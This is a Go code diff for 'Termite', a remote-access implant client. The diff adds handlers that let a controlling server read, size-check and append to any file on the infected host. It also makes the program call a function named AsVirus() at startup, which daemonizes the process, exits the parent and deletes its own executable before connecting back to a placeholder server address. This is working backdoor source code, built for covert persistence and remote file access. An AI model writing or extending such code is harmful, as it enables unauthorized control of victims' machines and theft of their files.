@@ -576,19 +576,88 @@ func handleConnection(c *Client) {
 				},
 			})
 			c.EncoderLock.Unlock()
+		case message.READ_FILE_EX:
+			token := msg.Body.(*message.BodyReadFileEx).Token
+			path := msg.Body.(*message.BodyReadFileEx).Path
+			start := msg.Body.(*message.BodyReadFileEx).Start
+			size := msg.Body.(*message.BodyReadFileEx).Size
+
+			f, _ := os.OpenFile(path, os.O_RDONLY|os.O_CREATE, 0644)
+			f.Seek(start, 0)
+			buffer := make([]byte, size)
+			n, _ := f.Read(buffer)
+			f.Close()
+
+			c.EncoderLock.Lock()
+			c.Encoder.Encode(message.Message{
+				Type: message.READ_FILE_EX_RESULT,
+				Body: message.BodyReadFileExResult{
+					Token:  token,
+					Result: buffer[0:n],
+					N:      n,
+				},
+			})
+			c.EncoderLock.Unlock()
+		case message.FILE_SIZE:
+			token := msg.Body.(*message.BodyFileSize).Token
+			path := msg.Body.(*message.BodyFileSize).Path
+
+			fi, err := os.Stat(path)
+			var n int64
+			if err != nil {
+				log.Error(err.Error())
+				n = -1
+			} else {
+				n = fi.Size()
+			}
+
+			c.EncoderLock.Lock()
+			c.Encoder.Encode(message.Message{
+				Type: message.FILE_SIZE_RESULT,
+				Body: message.BodyFileSizeResult{
+					Token: token,
+					N:     n,
+				},
+			})
+			c.EncoderLock.Unlock()
 		case message.WRITE_FILE:
 			token := msg.Body.(*message.BodyWriteFile).Token
 			path := msg.Body.(*message.BodyWriteFile).Path
 			content := msg.Body.(*message.BodyWriteFile).Content
-			err := ioutil.WriteFile(path, content, 0644)
-			n := len(content)
+
+			f, _ := os.OpenFile(path, os.O_WRONLY|os.O_CREATE, 0644)
+			n, err := f.Write(content)
 			if err != nil {
 				n = -1
 			}
+			f.Close()
+
 			c.EncoderLock.Lock()
 			c.Encoder.Encode(message.Message{
 				Type: message.WRITE_FILE_RESULT,
 				Body: message.BodyWriteFileResult{
+					Token: token,
+					N:     n,
+				},
+			})
+			c.EncoderLock.Unlock()
+		case message.WRITE_FILE_EX:
+			token := msg.Body.(*message.BodyWriteFileEx).Token
+			path := msg.Body.(*message.BodyWriteFileEx).Path
+			content := msg.Body.(*message.BodyWriteFileEx).Content
+
+			f, _ := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
+			n, err := f.Write(content)
+			if err != nil {
+				log.Error(err.Error())
+				n = -1
+			}
+			f.Close()
+
+			c.EncoderLock.Lock()
+			c.Encoder.Encode(message.Message{
+				Type: message.WRITE_FILE_EX_RESULT,
+				Body: message.BodyWriteFileExResult{
 					Token: token,
 					N:     n,
 				},
@@ -701,39 +770,37 @@ func AsVirus() {
 		Umask:   027,
 		Args:    []string{},
 	}
-
 	d, err := cntxt.Reborn()
 	if err != nil {
 		log.Error("Unable to run: ", err)
 	}
 	if d != nil {
+		os.Exit(0)
 		return
 	}
 	defer cntxt.Release()
 	log.Success("daemon started")
-
 	RemoveSelfExecutable()
 }
 
 func main() {
+	release := true
+	service := "127.0.0.1:13337"
+
+	if release {
+		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
+		AsVirus()
+	}
+
 	message.RegisterGob()
 	backoff = CreateBackOff()
 	processes = map[string]*TermiteProcess{}
 	pullTunnels = map[string]*net.Conn{}
 	pushTunnels = map[string]*net.Conn{}
-	service := "127.0.0.1:13337"
-	release := true
-
-	if release {
-		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
-	}
 
 	for {
 		log.Info("Termite (v%s) starting...", update.Version)
 		if StartClient(service) {
-			if release {
-				AsVirus()
-			}
 			add := (int64(rand.Uint64()) % backoff.Current)
 			log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
 			backoff.Sleep(add)
